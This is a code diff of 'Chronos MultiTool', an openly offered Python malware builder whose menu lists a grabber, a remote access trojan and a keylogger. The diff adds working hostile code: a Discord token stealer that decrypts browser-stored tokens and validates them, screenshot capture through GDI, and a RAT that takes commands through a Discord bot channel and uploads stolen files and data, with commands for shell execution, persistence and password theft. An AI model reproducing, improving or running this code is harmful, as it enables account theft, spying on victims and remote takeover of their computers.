@@ -3,9 +3,10 @@
 """
 CHRONOS MULTITOOL – Free Edition 
 ==========================================================
-Version: 2.2.3 – half release
+Version: 2.2.5 – Bata release 
 Author: Wasd
 FEATURES:
+
 [1] Build Grabber      – -base stealer features – 
 [2] Build RAT          – essential remote commands + limited stealing
 [3] Build Keylogger    – standalone keylogger 
@@ -15,7 +16,6 @@ FEATURES:
 [7] EXE to Image       – hide EXE inside PNG image (dogshit)
 [0] Exit
 """
-#plz do not skid this 
 import os
 import sys
 import json
@@ -48,8 +48,7 @@ if sys.platform == "win32":
         ctypes.windll.kernel32.SetConsoleOutputCP(65001)
     except:
         pass
-# ===== ALSO: Disable colorama if it causes issues =====
-# We'll still use it but with ANSI fallback.
+# Colorama setup (if ur a skid) – but we only use ANSI codes
 # ------------------------------------------------------------------
 # Dependency Check
 # ------------------------------------------------------------------
@@ -77,7 +76,7 @@ def check_dependencies():
 if not check_dependencies():
     sys.exit(1)
 # ------------------------------------------------------------------
-# Colorama setup (if ur a skid) – but we only use ANSI codes
+# Colorama setup (fallback if missing) – but we only use ANSI codes
 # ------------------------------------------------------------------
 try:
     from colorama import Fore, init
@@ -94,7 +93,7 @@ except ImportError:
         RESET = '\033[0m'
     init = lambda **kwargs: None
 # ------------------------------------------------------------------
-# CHRONOS LINKS – idk
+# CHRONOS LINKS – ASCII ONLY
 # ------------------------------------------------------------------
 CHRONOS_GITHUB = "https://github.com/ChronosToolsDev/Chronos-MultiTool"
 CHRONOS_YOUTUBE = "https://www.youtube.com/channel/UChmh2NDBPgdDTG3Cqy4TT1A"
@@ -2229,6 +2228,37 @@ try:
 except Exception:
     AES = None
 
+def _rat_log(msg):
+    try:
+        candidates = []
+        # Prefer builder output folder (cwd/output or next to exe/output)
+        cwd = os.getcwd()
+        candidates.append(os.path.join(cwd, "output"))
+        if getattr(sys, "frozen", False):
+            exe_dir = os.path.dirname(sys.executable)
+            candidates.append(os.path.join(exe_dir, "output"))
+            candidates.append(exe_dir)
+        else:
+            here = os.path.dirname(os.path.abspath(__file__))
+            candidates.append(os.path.join(here, "output"))
+            candidates.append(here)
+        candidates.append(os.environ.get("TEMP", "C:\\"))
+        log_path = None
+        for d in candidates:
+            if not d:
+                continue
+            try:
+                os.makedirs(d, exist_ok=True)
+                log_path = os.path.join(d, "rat_debug.log")
+                with open(log_path, "a") as f:
+                    f.write("%s | %s\n" % (datetime.datetime.now(), msg))
+                return
+            except Exception:
+                continue
+    except Exception:
+        pass
+_rat_log("RAT process started PID=%s frozen=%s" % (os.getpid(), getattr(sys, "frozen", False)))
+
 # ===== HARDCODED CREDENTIALS (change these) =====
 BOT_TOKEN = "REPLACE_WITH_BOT_TOKEN"
 CHANNEL_ID = "REPLACE_WITH_CHANNEL_ID"
@@ -2347,77 +2377,161 @@ def steal_passwords():
 
 # ---------- Discord Token Stealer ----------
 def steal_discord_tokens():
-    """Returns a string of all valid Discord tokens, with account info."""
-    paths = []
+    """Same approach as free grabber: leveldb + per-path Local State v10 decrypt + validate."""
     R = os.environ.get("APPDATA", "")
     L = os.environ.get("LOCALAPPDATA", "")
-    for sub in ["discord", "discordptb", "discordcanary"]:
-        paths.append(os.path.join(R, sub, "Local Storage", "leveldb"))
-    for browser, root in _chromium_paths().items():
+    path_map = {
+        "Discord": os.path.join(R, "discord"),
+        "Discord PTB": os.path.join(R, "discordptb"),
+        "Discord Canary": os.path.join(R, "discordcanary"),
+        "Chrome": os.path.join(L, "Google", "Chrome", "User Data", "Default"),
+        "Brave": os.path.join(L, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
+        "Edge": os.path.join(L, "Microsoft", "Edge", "User Data", "Default"),
+    }
+    # also other chromium profiles
+    for name, root in _chromium_paths().items():
         for profile in ["Default"] + ["Profile %d" % i for i in range(1, 6)]:
-            paths.append(os.path.join(root, profile, "Local Storage", "leveldb"))
-    regex = re.compile(r"dQw4w9WgXcQ:[^\"]+")
-    tokens = set()
-    for p in paths:
-        if not os.path.isdir(p):
+            p = os.path.join(root, profile)
+            if os.path.isdir(p) and name not in ("Chrome", "Brave", "Edge"):
+                path_map["%s|%s" % (name, profile)] = p
+    found = []
+    seen = set()
+    for platform, base_path in path_map.items():
+        if not os.path.exists(base_path):
             continue
-        for f in os.listdir(p):
-            if not f.endswith((".ldb", ".log")):
+        leveldb = os.path.join(base_path, "Local Storage", "leveldb")
+        if not os.path.isdir(leveldb):
+            continue
+        local_state = os.path.join(base_path, "Local State")
+        if not os.path.exists(local_state):
+            local_state = os.path.join(os.path.dirname(base_path), "Local State")
+        if not os.path.exists(local_state):
+            continue
+        key = CryptoMaster.get_v10_key(local_state)
+        if key is None:
+            continue
+        for fn in os.listdir(leveldb):
+            if not (fn.endswith(".ldb") or fn.endswith(".log")):
                 continue
             try:
-                with open(os.path.join(p, f), "r", errors="ignore") as fp:
+                with open(os.path.join(leveldb, fn), "r", errors="ignore") as fp:
                     data = fp.read()
-                for m in regex.finditer(data):
-                    tokens.add(m.group())
+                for match in re.findall(r"dQw4w9WgXcQ:[^\"']+", data):
+                    token_enc = match.replace("\\", "")
+                    try:
+                        raw = base64.b64decode(token_enc.split("dQw4w9WgXcQ:")[1])
+                        dec = CryptoMaster.decrypt_any(raw, key)
+                        if not dec or dec in seen:
+                            continue
+                        seen.add(dec)
+                        # validate
+                        try:
+                            req = urllib.request.Request(
+                                "https://discord.com/api/v9/users/@me",
+                                headers={"Authorization": dec, "Content-Type": "application/json"},
+                            )
+                            with urllib.request.urlopen(req, context=ssl._create_unverified_context(), timeout=8) as resp:
+                                if resp.status == 200:
+                                    info = json.loads(resp.read().decode())
+                                    line = "[%s] %s#%s | id=%s | email=%s | phone=%s | token=%s" % (
+                                        platform,
+                                        info.get("username", "?"),
+                                        info.get("discriminator", "0"),
+                                        info.get("id", "?"),
+                                        info.get("email") or "None",
+                                        info.get("phone") or "None",
+                                        dec,
+                                    )
+                                    found.append(line)
+                        except Exception:
+                            found.append("[%s] (unvalidated) %s" % (platform, dec))
+                    except Exception:
+                        pass
             except Exception:
                 pass
-    # decrypt tokens
-    decrypted = set()
-    for t in tokens:
-        try:
-            raw = base64.b64decode(t.split("dQw4w9WgXcQ:")[1])
-            # find the local state for this path's browser — best-effort
-            # use the Chrome local state as a fallback
-            ls = os.path.join(
-                os.environ.get("LOCALAPPDATA", ""),
-                "Google", "Chrome", "User Data", "Local State")
-            if not os.path.exists(ls):
-                continue
-            key = CryptoMaster.get_v10_key(ls)
-            if key is None:
-                continue
-            dec = CryptoMaster.decrypt_any(raw, key)
-            if dec:
-                decrypted.add(dec)
-        except Exception:
-            pass
-    # validate each token
-    ctx = ssl._create_unverified_context() if hasattr(ssl, "_create_unverified_context") else None
-    lines = []
-    for tok in decrypted:
-        try:
-            req = urllib.request.Request(
-                "https://discord.com/api/v10/users/@me",
-                headers={"Authorization": tok, "User-Agent": "Mozilla/5.0"})
-            with urllib.request.urlopen(req, timeout=8) as r:
-                if r.status == 200:
-                    u = json.loads(r.read().decode())
-                    lines.append("Token: %s\n  User: %s#%s\n  ID: %s\n  Email: %s\n" % (
-                        tok, u.get("username"), u.get("discriminator"),
-                        u.get("id"), u.get("email")))
-        except Exception:
-            pass
-    return "\n".join(lines) if lines else "No valid Discord tokens found."
+    if not found:
+        return "No valid Discord tokens found."
+    return "DISCORD TOKENS\n" + "=" * 40 + "\n" + "\n".join(found)
 
-# ---- Screenshot (PIL required) ----
+
 def take_screenshot():
+    # Try PIL first
     try:
         from PIL import ImageGrab
         shot = ImageGrab.grab(all_screens=True)
-        path = os.path.join(tempfile.gettempdir(), f"shot_{int(time.time())}.png")
+        path = os.path.join(tempfile.gettempdir(), "shot_%d.png" % int(time.time()))
         shot.save(path)
+        _rat_log("screenshot: PIL ok %s" % path)
         return path
-    except:
+    except Exception as e:
+        _rat_log("screenshot: PIL failed: %s" % e)
+    # Fallback: GDI BitBlt -> BMP (no PIL required)
+    try:
+        user32 = ctypes.windll.user32
+        gdi32 = ctypes.windll.gdi32
+        user32.SetProcessDPIAware()
+        w = user32.GetSystemMetrics(0)
+        h = user32.GetSystemMetrics(1)
+        hwnd = user32.GetDesktopWindow()
+        hdc = user32.GetWindowDC(hwnd)
+        mdc = gdi32.CreateCompatibleDC(hdc)
+        bmp = gdi32.CreateCompatibleBitmap(hdc, w, h)
+        gdi32.SelectObject(mdc, bmp)
+        gdi32.BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, 0x00CC0020)
+        # BITMAPINFO
+        class BITMAPINFOHEADER(ctypes.Structure):
+            _fields_ = [
+                ("biSize", ctypes.c_uint32),
+                ("biWidth", ctypes.c_int32),
+                ("biHeight", ctypes.c_int32),
+                ("biPlanes", ctypes.c_uint16),
+                ("biBitCount", ctypes.c_uint16),
+                ("biCompression", ctypes.c_uint32),
+                ("biSizeImage", ctypes.c_uint32),
+                ("biXPelsPerMeter", ctypes.c_int32),
+                ("biYPelsPerMeter", ctypes.c_int32),
+                ("biClrUsed", ctypes.c_uint32),
+                ("biClrImportant", ctypes.c_uint32),
+            ]
+        bi = BITMAPINFOHEADER()
+        bi.biSize = ctypes.sizeof(BITMAPINFOHEADER)
+        bi.biWidth = w
+        bi.biHeight = -h
+        bi.biPlanes = 1
+        bi.biBitCount = 24
+        bi.biCompression = 0
+        row = (w * 3 + 3) & ~3
+        buf = ctypes.create_string_buffer(row * h)
+        gdi32.GetDIBits(mdc, bmp, 0, h, buf, ctypes.byref(bi), 0)
+        path = os.path.join(tempfile.gettempdir(), "shot_%d.bmp" % int(time.time()))
+        # write minimal BMP
+        fh_size = 14
+        ih_size = 40
+        off = fh_size + ih_size
+        size = off + row * h
+        with open(path, "wb") as f:
+            f.write(b"BM")
+            f.write(size.to_bytes(4, "little"))
+            f.write((0).to_bytes(4, "little"))
+            f.write(off.to_bytes(4, "little"))
+            f.write(ih_size.to_bytes(4, "little"))
+            f.write(w.to_bytes(4, "little", signed=True))
+            f.write(h.to_bytes(4, "little", signed=True))
+            f.write((1).to_bytes(2, "little"))
+            f.write((24).to_bytes(2, "little"))
+            f.write((0).to_bytes(4, "little"))
+            f.write((row * h).to_bytes(4, "little"))
+            f.write((0).to_bytes(16, "little"))
+            # bottom-up
+            for y in range(h - 1, -1, -1):
+                f.write(buf[y * row:(y + 1) * row])
+        gdi32.DeleteObject(bmp)
+        gdi32.DeleteDC(mdc)
+        user32.ReleaseDC(hwnd, hdc)
+        _rat_log("screenshot: GDI ok %s" % path)
+        return path
+    except Exception as e:
+        _rat_log("screenshot: GDI failed: %s" % e)
         return None
 
 # ---- Webcam (cv2 required) ----
@@ -2484,54 +2598,81 @@ def kill_process(pid):
 # ---- Discord sending (no requests module, use urllib) ----
 def send_discord(token, channel, msg, split=False):
     if not msg:
-        return
+        return False
     if not split and len(msg) <= 1900:
-        content = f"```\n{msg}\n```"
-        data = json.dumps({"content": content}).encode('utf-8')
-        req = urllib.request.Request(f"https://discord.com/api/v9/channels/{channel}/messages",
-                                     data=data,
-                                     headers={"Authorization": f"Bot {token}", "Content-Type": "application/json"},
-                                     method="POST")
+        body = "```\n" + msg + "\n```"
+        data = json.dumps({"content": body}).encode("utf-8")
+        req = urllib.request.Request(
+            "https://discord.com/api/v9/channels/%s/messages" % channel,
+            data=data,
+            headers={
+                "Authorization": "Bot %s" % token,
+                "Content-Type": "application/json",
+                "User-Agent": "DiscordBot (chronos-free, 1.0)",
+            },
+            method="POST",
+        )
         try:
-            urllib.request.urlopen(req, timeout=10)
-        except:
-            pass
+            with urllib.request.urlopen(req, context=ssl._create_unverified_context(), timeout=15) as resp:
+                _rat_log("send: HTTP %s content=%r" % (resp.status, msg[:60]))
+                return True
+        except Exception as e:
+            _rat_log("send FAILED: %s: %s" % (type(e).__name__, e))
+            return False
     else:
         chunks = [msg[i:i+1900] for i in range(0, len(msg), 1900)]
+        ok = True
         for chunk in chunks:
-            send_discord(token, channel, chunk, split=False)
+            if not send_discord(token, channel, chunk, split=False):
+                ok = False
+        return ok
 
 def send_file_discord(token, channel, file_data, filename):
-    boundary = '----WebKitFormBoundary' + ''.join(random.choices('abcdef0123456789', k=16))
-    body_parts = []
-    body_parts.append(f'--{boundary}\r\n'.encode())
-    body_parts.append('Content-Disposition: form-data; name="file"; filename="{}"\r\n'.format(filename).encode())
-    body_parts.append('Content-Type: application/octet-stream\r\n\r\n'.encode())
-    body_parts.append(file_data)
-    body_parts.append(b'\r\n')
-    body_parts.append(f'--{boundary}--\r\n'.encode())
-    body = b''.join(body_parts)
-    headers = {
-        "Authorization": f"Bot {token}",
-        "Content-Type": f"multipart/form-data; boundary={boundary}"
-    }
-    req = urllib.request.Request(f"https://discord.com/api/v9/channels/{channel}/messages",
-                                 data=body, headers=headers, method="POST")
     try:
-        urllib.request.urlopen(req, timeout=30)
-    except:
-        pass
+        boundary = "----WebKitFormBoundary" + "".join(random.choices("abcdef0123456789", k=16))
+        # payload_json optional caption
+        payload = json.dumps({"content": "File: %s" % filename})
+        parts = []
+        parts.append(("--%s\r\n" % boundary).encode())
+        parts.append(b'Content-Disposition: form-data; name="payload_json"\r\nContent-Type: application/json\r\n\r\n')
+        parts.append(payload.encode() + b"\r\n")
+        parts.append(("--%s\r\n" % boundary).encode())
+        parts.append(('Content-Disposition: form-data; name="file"; filename="%s"\r\n' % filename).encode())
+        parts.append(b"Content-Type: application/octet-stream\r\n\r\n")
+        parts.append(file_data)
+        parts.append(b"\r\n")
+        parts.append(("--%s--\r\n" % boundary).encode())
+        body = b"".join(parts)
+        headers = {
+            "Authorization": "Bot %s" % token,
+            "Content-Type": "multipart/form-data; boundary=%s" % boundary,
+            "User-Agent": "DiscordBot (chronos-free, 1.0)",
+        }
+        req = urllib.request.Request(
+            "https://discord.com/api/v9/channels/%s/messages" % channel,
+            data=body,
+            headers=headers,
+            method="POST",
+        )
+        with urllib.request.urlopen(req, context=ssl._create_unverified_context(), timeout=60) as resp:
+            _rat_log("send_file: HTTP %s file=%s size=%d" % (resp.status, filename, len(file_data)))
+            return True
+    except Exception as e:
+        _rat_log("send_file FAILED: %s: %s" % (type(e).__name__, e))
+        return False
 
 # ---- RAT Core ----
 class LimitedRAT:
     def __init__(self, token, channel, prefix, whitelist):
-        self.token = token
-        self.channel = channel
-        self.prefix = prefix
+        self.token = (token or "").strip()
+        self.channel = str(channel or "").strip()
+        self.prefix = (prefix or "!").strip() or "!"
         self.whitelist = whitelist
         self.running = True
         self.processed = set()
-        send_discord(self.token, self.channel, f"Chronos RAT Online – {socket.gethostname()}")
+        _rat_log("LimitedRAT init channel=%s prefix=%s token_len=%d" % (self.channel, self.prefix, len(self.token)))
+        ok = send_discord(self.token, self.channel, "Chronos RAT Online - %s" % socket.gethostname())
+        _rat_log("online message send result=%s" % ok)
 
     def is_authorized(self, author_id):
         return str(author_id) in self.whitelist if self.whitelist else True
@@ -2540,35 +2681,57 @@ class LimitedRAT:
         send_discord(self.token, self.channel, msg, split)
 
     def send_file(self, file_data, filename):
-        send_file_discord(self.token, self.channel, file_data, filename)
+        return send_file_discord(self.token, self.channel, file_data, filename)
 
     def poll(self):
         while self.running:
             try:
-                req = urllib.request.Request(f"https://discord.com/api/v9/channels/{self.channel}/messages?limit=5",
-                                             headers={"Authorization": f"Bot {self.token}"})
-                resp = urllib.request.urlopen(req, timeout=10)
-                data = json.loads(resp.read().decode())
+                _rat_log("poll: tick channel=%s processed=%d" % (self.channel, len(self.processed)))
+                req = urllib.request.Request(
+                    "https://discord.com/api/v9/channels/%s/messages?limit=5" % self.channel,
+                    headers={
+                        "Authorization": "Bot %s" % self.token,
+                        "User-Agent": "DiscordBot (chronos-free, 1.0)",
+                    },
+                )
+                with urllib.request.urlopen(req, context=ssl._create_unverified_context(), timeout=15) as resp:
+                    raw = resp.read().decode()
+                    status = resp.status
+                _rat_log("poll: HTTP %s bytes=%d" % (status, len(raw)))
+                if status != 200:
+                    _rat_log("poll: body=%s" % raw[:300])
+                    time.sleep(10)
+                    continue
+                data = json.loads(raw)
+                if not isinstance(data, list):
+                    _rat_log("poll: unexpected type %s" % type(data).__name__)
+                    time.sleep(10)
+                    continue
+                _rat_log("poll: got %d messages" % len(data))
                 for msg in data:
-                    mid = msg.get('id')
+                    mid = msg.get("id")
                     if mid in self.processed:
                         continue
                     self.processed.add(mid)
-                    author_id = msg.get('author', {}).get('id')
-                    if not self.is_authorized(author_id):
+                    author = msg.get("author", {})
+                    author_id = author.get("id")
+                    if author.get("bot"):
                         continue
-                    content = msg.get('content', '')
-                    if content.startswith(self.prefix):
-                        cmd = content[len(self.prefix):].strip()
+                    if not self.is_authorized(author_id):
+                        _rat_log("poll: skipped non-whitelist %s" % author_id)
+                        continue
+                    text = (msg.get("content") or "").strip()
+                    _rat_log("poll: seen msg from %s content=%r" % (author_id, text[:80]))
+                    if text.startswith(self.prefix):
+                        cmd = text[len(self.prefix):].strip()
+                        _rat_log("poll: dispatch cmd=%r" % cmd)
                         try:
                             self.execute(cmd, msg)
                         except Exception as e:
-                            self.send(f"Error: {str(e)}")
+                            _rat_log("poll: execute error %s: %s" % (type(e).__name__, e))
+                            self.send("Error: %s" % e)
             except Exception as e:
-                try:
-                    self.send(f"Poll error: {str(e)}")
-                except:
-                    pass
+                _rat_log("poll EXCEPTION: %s: %s" % (type(e).__name__, e))
             time.sleep(10)
 
     def execute(self, cmd_str, msg):
@@ -2578,7 +2741,24 @@ class LimitedRAT:
         command = parts[0].lower()
         args = parts[1:] if len(parts) > 1 else []
         
-        if command == "info":
+        if command == "help":
+            self.send(
+                "COMMANDS\n"
+                "========\n"
+                "help - this list\n"
+                "info - system info\n"
+                "shutdown / restart / bsod / lock\n"
+                "msgbox <text>\n"
+                "cmd <command>\n"
+                "list - list files\n"
+                "launch <app>\n"
+                "processes / processkill <name>\n"
+                "startup - add persistence\n"
+                "screenshot / webcam\n"
+                "passwords / discord / steal_all\n"
+                "kill - exit RAT"
+            )
+        elif command == "info":
             info = get_sysinfo()
             text = "SYSTEM INFO\n" + "="*50 + "\n"
             for k, v in info.items():
@@ -2655,12 +2835,22 @@ class LimitedRAT:
         elif command == "screenshot":
             path = take_screenshot()
             if path:
-                with open(path, 'rb') as f:
-                    self.send_file(f.read(), "screenshot.png")
-                os.remove(path)
-                self.send("Screenshot captured.")
+                try:
+                    with open(path, "rb") as f:
+                        data = f.read()
+                    ok = self.send_file(data, "screenshot.png")
+                    try:
+                        os.remove(path)
+                    except Exception:
+                        pass
+                    if ok:
+                        self.send("Screenshot uploaded (%d bytes)." % len(data))
+                    else:
+                        self.send("Screenshot taken but upload failed. Check rat_debug.log")
+                except Exception as e:
+                    self.send("Screenshot error: %s" % e)
             else:
-                self.send("Screenshot failed (PIL missing).")
+                self.send("Screenshot failed.")
         elif command == "webcam":
             path = take_webcam()
             if path:
@@ -2724,10 +2914,21 @@ class LimitedRAT:
             self.send(f"Unknown command: {command}")
 
 if __name__ == "__main__":
-    time.sleep(random.randint(1,5))
-    whitelist = [uid.strip() for uid in WHITELIST.split(',') if uid.strip()] if WHITELIST else []
-    rat = LimitedRAT(BOT_TOKEN, CHANNEL_ID, COMMAND_PREFIX, whitelist)
-    rat.poll()
+    try:
+        _rat_log("entering main()")
+        time.sleep(random.randint(1, 3))
+        whitelist = [uid.strip() for uid in WHITELIST.split(",") if uid.strip()] if WHITELIST else []
+        _rat_log("main: creating LimitedRAT")
+        rat = LimitedRAT(BOT_TOKEN, CHANNEL_ID, COMMAND_PREFIX, whitelist)
+        _rat_log("main: entering poll loop")
+        rat.poll()
+    except Exception as e:
+        _rat_log("FATAL in main: %s: %s" % (type(e).__name__, e))
+        try:
+            import traceback
+            _rat_log(traceback.format_exc())
+        except Exception:
+            pass
 '''
 # ============================================================================
 # STUB_KEYLOGGER – FULL (FREE this is shit i'ma update it later)
@@ -2970,7 +3171,7 @@ if __name__ == "__main__":
     main()
 '''
 # ============================================================================
-# OBFUSCATOR – fixed (FREE) shit aswell
+# # OBFUSCATOR – fixed (FREE) shit aswell
 # ============================================================================
 class UltimateObfuscator:
     def __init__(self, filename):
@@ -3154,66 +3355,78 @@ class Builder:
         self.output_dir.mkdir(exist_ok=True)
     def _compile(self, stub_code: str, name: str, console: bool, icon: bool, silent: bool, replacements: dict):
         try:
-            import PyInstaller
+            import PyInstaller.__main__ as _pyi_main
         except ImportError:
-            print(Colors.RED + "[X] PyInstaller is not installed. Please run: pip install pyinstaller" + Colors.RESET)
+            print(Colors.RED + "[X] PyInstaller is not available in this build." + Colors.RESET)
             return False
+
         # Replace placeholders
         for k, v in replacements.items():
             v_escaped = v.replace('\\', '\\\\').replace('"', '\\"')
             v_escaped = v_escaped.replace('\x00', '')
             stub_code = stub_code.replace(k, v_escaped)
             stub_code = stub_code.replace('\x00', '')
+        
         temp_stub = self.output_dir / f"{name}_stub_temp.py"
         with open(temp_stub, 'w', encoding='utf-8') as f:
             f.write(stub_code)
-        # Minimal hidden imports – avoid heavy deps for fast compile
-        hidden_imports = [
+
+        args = [
+            "--onefile",
+            "--noconfirm",
+            "--clean",
+            "--distpath", str(Path("dist").resolve()),
+            "--workpath", str(Path("build").resolve()),
+            "--specpath", str(Path(".").resolve()),
+            "--name", name,
+        ]
+        args.extend([
             "--hidden-import=requests",
             "--hidden-import=win32crypt",
             "--hidden-import=Crypto",
             "--hidden-import=Crypto.Cipher.AES",
+            "--hidden-import=PIL",
+            "--hidden-import=PIL.ImageGrab",
             "--hidden-import=encodings",
             "--hidden-import=codecs",
             "--hidden-import=encodings.utf_8",
             "--hidden-import=encodings.ascii",
             "--hidden-import=encodings.latin_1",
-        ]
-        console_flag = "--noconsole" if not console else ""
-        cmd = [
-            sys.executable, "-m", "PyInstaller",
-            "--onefile",
-            *hidden_imports,
-            "--collect-all=encodings",
-        ]
-        if console_flag:
-            cmd.append(console_flag)
+        ])
+        args.append("--collect-all=encodings")
+        if not console:
+            args.append("--noconsole")
         if icon and os.path.exists("icon.ico"):
-            cmd.extend(["--icon=icon.ico"])
-        cmd.extend(["--name", name, str(temp_stub)])
+            args.extend(["--icon", "icon.ico"])
+        args.append(str(temp_stub.resolve()))
+
+        print(Colors.GRAY + "    pyinstaller " + " ".join(args[:-1]) + " <stub>" + Colors.RESET)
+
         try:
-            # Increase timeout to 600 seconds (10 minutes) to avoid timeouts
-            result = subprocess.run(cmd, check=False, timeout=600, capture_output=True, text=True)
-            if result.returncode != 0:
-                print(Colors.RED + "[X] PyInstaller error:" + Colors.RESET)
-                print(result.stdout)
-                print(result.stderr)
+            _pyi_main.run(args)
+        except SystemExit as e:
+            if e.code not in (0, None):
+                print(Colors.RED + f"[X] PyInstaller exited with code {e.code}" + Colors.RESET)
                 return False
-            dist_exe = Path("dist") / f"{name}.exe"
+        except Exception as e:
+            print(Colors.RED + f"[X] PyInstaller raised: {type(e).__name__}: {e}" + Colors.RESET)
+            return False
+
+        dist_exe = Path("dist") / f"{name}.exe"
+        try:
             if dist_exe.exists():
                 shutil.copy2(dist_exe, self.output_dir / f"{name}.exe")
                 shutil.rmtree("build", ignore_errors=True)
                 shutil.rmtree("dist", ignore_errors=True)
+                if temp_stub.exists():
+                    temp_stub.unlink()
                 return True
             else:
-                print(Colors.RED + "[X] Compilation succeeded but output EXE not found." + Colors.RESET)
+                print(Colors.RED + f"[X] Compilation finished but {dist_exe} not found." + Colors.RESET)
                 return False
         except Exception as e:
-            print(Colors.RED + f"[X] Unexpected error during compilation: {e}" + Colors.RESET)
+            print(Colors.RED + f"[X] Post-compile step failed: {type(e).__name__}: {e}" + Colors.RESET)
             return False
-        finally:
-            if temp_stub.exists():
-                temp_stub.unlink()
     # ---- Builder methods ----
     def build_grabber(self):
         clear_screen()
@@ -3545,6 +3758,15 @@ def main_menu():
 # START
 # ============================================================================
 if __name__ == "__main__":
+    try:
+        if getattr(sys, "frozen", False):
+            base_dir = os.path.dirname(sys.executable)
+        else:
+            base_dir = os.path.dirname(os.path.abspath(__file__))
+        os.chdir(base_dir)
+    except Exception:
+        pass
+
     if os.name == 'nt':
         os.system("title Chronos Builder – Free Edition")
         try:
